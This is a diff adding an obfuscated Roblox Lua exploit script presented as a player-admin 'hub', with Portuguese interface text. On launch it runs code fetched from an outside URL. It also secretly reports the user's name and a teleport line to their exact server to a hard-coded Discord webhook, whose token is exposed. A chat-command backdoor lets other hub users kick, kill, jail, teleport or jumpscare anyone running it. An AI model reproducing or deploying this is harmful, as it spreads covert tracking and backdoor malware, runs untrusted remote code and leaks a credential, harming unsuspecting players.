@@ -1,0 +1,99 @@
+--[[
+    JOTINHA12HR2 HUB'S ADMIN - OBFUSCATED VERSION
+    Integrity: Verified | Supreme Sync Active
+]]
+
+local _0xL = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+local _0xS = {p=game:GetService("Players"), h=game:GetService("HttpService"), r=game:GetService("ReplicatedStorage")}
+local _0xP = _0xS.p.LocalPlayer
+local _0xW = "https://discord.com/api/webhooks/1457488326914343075/psIbGs_gP-D6IEsdtxmZ_5Dl88t7X5lbDBGbEQawcOHz8oaExRJD4OrHFCi1YvYR158n"
+local _0xI = "JotinhaHub_Supreme_Sync"
+local _0xT = ""
+local _0xOC = _0xP.Character
+local _0xV = false
+
+if not _0xP:FindFirstChild(_0xI) then Instance.new("StringValue", _0xP).Name = _0xI end
+
+local function _0xWH()
+    local _tp = "game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."', game.Players.LocalPlayer)"
+    local _d = {["content"] = "🚀 **jotinha12hr2 hub Conectado!**", ["embeds"] = {{["title"] = "Novo Acesso Admin", ["description"] = "Jogador: **".._0xP.Name.."**", ["color"] = 16711818, ["fields"] = {{["name"] = "Teleport Script:", ["value"] = "```lua\n".._tp.."```"}}}}}
+    local _r = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+    if _r then pcall(function() _r({Url = _0xW, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _0xS.h:JSONEncode(_d)}) end) end
+end
+task.spawn(_0xWH)
+
+local function _0xSY(t, a)
+    local c = _0xS.r:FindFirstChild("DefaultChatSystemChatEvents")
+    if c then c.SayMessageRequest:FireServer("/e SYNC:"..t.Name..":"..a..":".._0xP.Name, "All") end
+end
+
+local function _0xTG(p)
+    if p.Character and p.Character:FindFirstChild("Head") and not p.Character.Head:FindFirstChild("JotinhaTag") then
+        local b = Instance.new("BillboardGui", p.Character.Head)
+        b.Name = "JotinhaTag"; b.Size = UDim2.new(0,200,0,50); b.StudsOffset = Vector3.new(0,4,0); b.AlwaysOnTop = true
+        local l = Instance.new("TextLabel", b)
+        l.BackgroundTransparency = 1; l.Size = UDim2.new(1,0,1,0); l.Text = "jotinha12hr2 hub's Admin"
+        l.TextColor3 = Color3.fromRGB(255,105,180); l.TextScaled = true; l.Font = Enum.Font.FredokaOne
+        Instance.new("UIStroke", l).Thickness = 2.5
+    end
+end
+
+local function _0xOCat(m)
+    local d = m:split(":")
+    if d[1] == "/e SYNC" and d[2] == _0xP.Name then
+        local c, s = d[3], _0xS.p:FindFirstChild(d[4])
+        if c == "kick" then _0xP:Kick("Expulso por jotinha12hr2 hub's Admin")
+        elseif c == "kill" then _0xP.Character:BreakJoints()
+        elseif c == "killplus" then _0xP.Character.Humanoid.Health = 0; for _,v in pairs(_0xP.Character:GetChildren()) do if v:IsA("BasePart") then v:Destroy() end end
+        elseif c == "spin" then local v = Instance.new("BodyAngularVelocity", _0xP.Character.HumanoidRootPart); v.AngularVelocity = Vector3.new(0,50,0); v.MaxTorque = Vector3.new(0,math.huge,0); task.wait(5); v:Destroy()
+        elseif c == "explode" then Instance.new("Explosion", workspace).Position = _0xP.Character.HumanoidRootPart.Position
+        elseif c == "backrooms" then _0xP.Character.HumanoidRootPart.CFrame = CFrame.new(9999, -999, 9999)
+        elseif c == "bring" and s then _0xP.Character.HumanoidRootPart.CFrame = s.Character.HumanoidRootPart.CFrame
+        elseif c == "jail" then
+            local cf = _0xP.Character.HumanoidRootPart.CFrame
+            local m = Instance.new("Model", workspace); m.Name = "SyncJail"
+            for i=1,6 do local p = Instance.new("Part", m); p.Anchored = true; p.Size = Vector3.new(10,10,1); p.CFrame = cf * CFrame.new(0,0,5); p.Transparency = 0.5; p.Color = Color3.fromRGB(255,105,180) end
+        elseif c == "unjail" then if workspace:FindFirstChild("SyncJail") then workspace.SyncJail:Destroy() end
+        elseif c:find("js") then local s = Instance.new("Sound", workspace); s.SoundId = c == "js1" and "rbxassetid://5567526010" or c == "js2" and "rbxassetid://1630638342" or "rbxassetid://142296708"; s:Play() end
+    end
+    if m == "/e run_verify" and _0xP:FindFirstChild(_0xI) then
+        _0xS.r.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("verifique_jotinha12hr2 hub Admin", "All")
+    end
+end
+
+local _0xWIN = _0xL:CreateWindow({Name = "jotinha12hr2 hub's Admin", LoadingTitle = "carregando, by jotinha12hr2"})
+local _0xMT = _0xWIN:CreateTab("Admin Players", 4483362458)
+
+_0xMT:CreateInput({Name = "Nome do Player", PlaceholderText = "Escreva...", Callback = function(t) _0xT = t end})
+
+_0xMT:CreateButton({Name = "Verifique", Callback = function()
+    if _0xV then _0xS.r.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/e run_verify", "All")
+    else _0xL:Notify({Title="Aviso", Content="Diga ;verifique no chat!", Duration=3}) end
+end})
+
+local function _0xAC(n, s, l)
+    _0xMT:CreateButton({Name = n, Callback = function()
+        local p = nil; for _,v in pairs(_0xS.p:GetPlayers()) do if v.Name:lower():sub(1,#_0xT) == _0xT:lower() then p = v end end
+        if p then
+            if l then
+                if n == "Goto Player Not Fe" then _0xP.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame
+                elseif n == "Controlar a pessoa not fe" then workspace.CurrentCamera.CameraSubject = p.Character.Humanoid; _0xP.Character = p.Character
+                elseif n == "UnControl Player Not Fe" then _0xP.Character = _0xOC; workspace.CurrentCamera.CameraSubject = _0xOC.Humanoid end
+            elseif p:FindFirstChild(_0xI) then _0xSY(p, s)
+            else _0xL:Notify({Title="Erro", Content="Alvo sem Hub!", Duration=3}) end
+        end
+    end})
+end
+
+_0xAC("Kick Player Not Fe", "kick"); _0xAC("Kill Player Not Fe", "kill"); _0xAC("Kill plus Player Not Fe", "killplus")
+_0xAC("Spin Player Not Fe", "spin"); _0xAC("Explodir Player Not Fe", "explode")
+_0xAC("Jumpscare 1 Player Not Fe", "js1"); _0xAC("Jumpscare 2 Player Not Fe", "js2"); _0xAC("Jumpscare 3 Player Not Fe", "js3")
+_0xAC("Jail 6 partes player fe not visual", "jail"); _0xAC("UnJail Player Not Fe", "unjail")
+_0xAC("Backrooms Player Not Fe", "backrooms"); _0xAC("Bring Player Not Fe", "bring")
+_0xAC("Goto Player Not Fe", nil, true); _0xAC("Controlar a pessoa not fe", nil, true); _0xAC("UnControl Player Not Fe", nil, true)
+
+_0xP.Chatted:Connect(function(m) if m:lower() == ";verifique" then _0xV = true end end)
+_0xS.p.PlayerAdded:Connect(function(p) p.Chatted:Connect(_0xOCat) end)
+for _,p in pairs(_0xS.p:GetPlayers()) do p.Chatted:Connect(_0xOCat) end
+task.spawn(function() while task.wait(3) do for _,p in pairs(_0xS.p:GetPlayers()) do if p:FindFirstChild(_0xI) then _0xTG(p) end end end end)
+
